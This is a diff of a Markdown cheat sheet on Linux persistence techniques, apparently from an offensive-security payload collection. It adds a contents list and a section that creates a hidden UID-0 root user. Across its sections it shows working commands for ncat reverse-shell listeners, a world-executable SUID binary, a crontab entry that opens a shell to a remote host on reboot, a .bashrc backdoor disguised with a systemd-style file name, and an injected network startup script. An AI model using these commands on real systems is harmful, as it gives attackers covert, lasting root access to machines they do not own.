@@ -1,11 +1,34 @@
 # Linux - Persistence
 
+## Summary
+
+* [Basic reverse shell](#basic-reverse-shell)
+* [Add a root user](#add-a-root-user)
+* [Suid Binary](#suid-binary)
+* [Crontab - Reverse shell](#crontab-reverse-shell)
+* [Backdooring a user's bash_rc](#backdooring-an-users-bash-rc)
+* [Backdooring a startup service](#backdoor-a-startup-service)
+* [Backdooring a user startup file](#backdooring-an-user-startup-file)
+* [Backdooring a driver](#backdooring-a-driver)
+* [Backdooring the APT](#backdooring-the-apt)
+* [Backdooring the SSH](#backdooring-the-ssh)
+* [Tips](#tips)
+* [References](#references)
+
+
 ## Basic reverse shell
 
 ```bash
 ncat --udp -lvp 4242
 ncat --sctp -lvp 4242
 ncat --tcp -lvp 4242
+```
+
+## Add a root user
+
+```powershell
+sudo useradd -ou 0 -g 0 john
+sudo passwd john
 ```
 
 ## Suid Binary
@@ -19,13 +42,15 @@ chown root:root $TMPDIR2/croissant
 chmod 4777 $TMPDIR2/croissant
 ```
 
-## Crontab (Reverse shell to 192.168.1.2 on port 4242)
+## Crontab - Reverse shell
 
 ```bash
 (crontab -l ; echo "@reboot sleep 200 && ncat 192.168.1.2 4242 -e /bin/bash")|crontab 2> /dev/null
 ```
 
-## Backdooring an user's bash_rc (FR/EN Version)
+## Backdooring a user's bash_rc 
+
+(FR/EN Version)
 
 ```bash
 TMPNAME2=".systemd-private-b21245afee3b3274d4b2e2-systemd-timesyncd.service-IgCBE0"
@@ -48,7 +73,7 @@ RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
 sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
 ```
 
-## Backdooring an user startup file
+## Backdooring a user startup file
 
 Linux, write a file in  `~/.config/autostart/NAME_OF_FILE.desktop`
 
